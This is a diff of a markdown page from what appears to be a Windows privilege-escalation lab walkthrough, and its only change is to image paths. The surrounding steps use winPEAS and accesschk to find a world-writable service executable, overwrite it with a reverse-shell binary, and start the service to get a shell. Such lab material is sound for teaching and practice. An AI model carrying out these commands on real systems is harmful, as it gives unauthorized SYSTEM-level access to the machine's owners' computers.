@@ -8,7 +8,7 @@ Run winPEAS to check for service misconfigurations:
 winPEASany.exe quiet servicesinfo
 ```
 
-![](../../../../../.gitbook/assets/image%20%2886%29.png)
+![](../../../../.gitbook/assets/image%20%2886%29.png)
 
 Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:
 
@@ -16,7 +16,7 @@ Note that the “filepermsvc” service has an executable which appears to be wr
 accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
 
-![](../../../../../.gitbook/assets/image%20%2891%29.png)
+![](../../../../.gitbook/assets/image%20%2891%29.png)
 
 Create a backup of the original service executable:
 
@@ -30,7 +30,7 @@ Copy the reverse shell executable to overwrite the service executable:
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
 
-![](../../../../../.gitbook/assets/image%20%2896%29.png)
+![](../../../../.gitbook/assets/image%20%2896%29.png)
 
 Start a listener on Kali, and then start the service to trigger the exploit:
 
@@ -38,7 +38,7 @@ Start a listener on Kali, and then start the service to trigger the exploit:
 net start filepermsvc
 ```
 
-![](../../../../../.gitbook/assets/image%20%2883%29.png)
+![](../../../../.gitbook/assets/image%20%2883%29.png)
 
 
 
